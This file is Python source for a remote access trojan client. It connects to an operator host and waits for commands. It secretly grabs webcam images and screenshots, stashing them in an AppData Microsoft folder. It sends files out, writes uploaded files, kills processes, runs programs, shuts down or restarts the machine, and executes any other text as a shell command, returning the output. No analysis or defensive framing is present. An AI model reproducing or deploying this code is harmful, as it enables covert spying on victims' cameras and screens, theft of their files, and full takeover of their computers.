import socket
import time
import subprocess
import os
import cv2
import mss

def connect():
    global client
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.bind(("IP_ADRESS", IP_PORT))
            client.send("Client1".encode())
            break
        except:
            time.sleep(5)

cwd = os.getcwd()
cap = cv2.VideoCapture(0)

savepath = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\"
connect()
while True:
    
    try:
        message = client.recv(1024).decode()
        print(message)
        if message[:2].lower() == "cd" :
            if os.path.exists(message[3:]):
                cwd=message[3:]
                client.send(f"new dir : {cwd}".encode())
            else:
                client.send("The directory name is invalid".encode())

        elif message[:6].lower() == "screen" :
            try:
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1]) # changer le screen avec le message
                    mss.tools.to_png(screenshot.rgb, screenshot.size, output=savepath + "capturescreen.png")
                with open(savepath + 'capturescreen.png', "rb") as f:
                    client.sendall(f.read())
                f.close()
                os.remove(savepath + "capturescreen.png")
            except:
                client.send("This screen doesn't exist.")

        elif message[:3].lower() == "cam" :
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(savepath + "capturecam.png", frame)
                cap.release()
                with open(savepath + "capturecam.png", "rb") as f:
                    client.sendall(f.read())
                f.close()
                cap = cv2.VideoCapture(0) # changer le cam avec le message mais faut une variable
                os.remove(savepath + "capturecam.png") 
            else:
                client.send("This user doesn't have a camera.".encode())
                cap = cv2.VideoCapture(0)

        elif message[:8].lower() == "download": 
            with open(message[9:], "rb") as f:
                client.sendall(f.read())
            f.close()

        elif message[:6].lower() == "upload": # changer un truc car sinon upload vide meme ssi truc existe pas
            fileUpload=os.path.basename(message[7:])
            with open(fileUpload, "wb") as f:
                client.settimeout(2)
                try:
                    while True:
                        data = client.recv(1024)
                        f.write(data)
                except socket.timeout:
                    client.settimeout(None)
            client.send("Upload has ended.".encode())

        elif message[:4].lower() == "kill":
            if message[5:].isdigit():
                response = subprocess.run("taskkill /F /PID " + message[5:], shell=True, capture_output=True, text=True, cwd=cwd)
            elif type(message[5:]) == str:
                response = subprocess.run("taskkill /F /IM " + message[5:], shell=True, capture_output=True, text=True, cwd=cwd)
            if response.returncode == 0 :
                client.sendall(response.stdout.encode())
            else:
                client.send("This process does not exist".encode())

        elif message[:5].lower() == "start":
            if os.path.isfile(message[6:]):
                subprocess.Popen(message, shell=True, cwd=cwd)
                client.send("File has been executed.".encode())
            else:
                client.send("This file does not exist".encode())

        elif message[:8].lower() == "shutdown":
            client.send("Shutting down...".encode())
            subprocess.run("shutdown /s /f /t 0", shell=True, capture_output=True, text=True, cwd=cwd)

        elif message[:7].lower() == "restart":
            client.send("Restarting...".encode())
            subprocess.run("shutdown /r /f /t 0", shell=True, capture_output=True, text=True, cwd=cwd)
        else:
            response = subprocess.run(message, shell=True, capture_output=True, text=True, cwd=cwd)
            if response.returncode == 0 :
                client.sendall(response.stdout.encode())
            else:
                client.send("This is not an existing command".encode())
    except:
        connect()